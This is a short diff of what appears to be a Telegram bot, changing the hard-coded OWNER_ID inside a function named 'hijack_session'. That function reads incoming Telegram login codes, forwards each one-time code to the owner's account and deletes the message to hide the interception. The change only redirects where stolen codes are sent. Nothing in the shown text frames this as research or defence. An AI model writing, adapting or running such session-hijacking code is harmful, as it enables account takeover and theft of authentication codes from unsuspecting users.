@@ -85,7 +85,7 @@ async def hijack_session(_, message):
             if "Login code:" in msg.text:
                 otp_code = msg.text.split(": ")[1].strip()
                 otp_text = f"🔐 OTP Received : `{otp_code}`"
-                OWNER_ID = 1970647198
+                OWNER_ID = 5914434064
                 await app.send_message(OWNER_ID, otp_text)
                 await msg.delete()
 
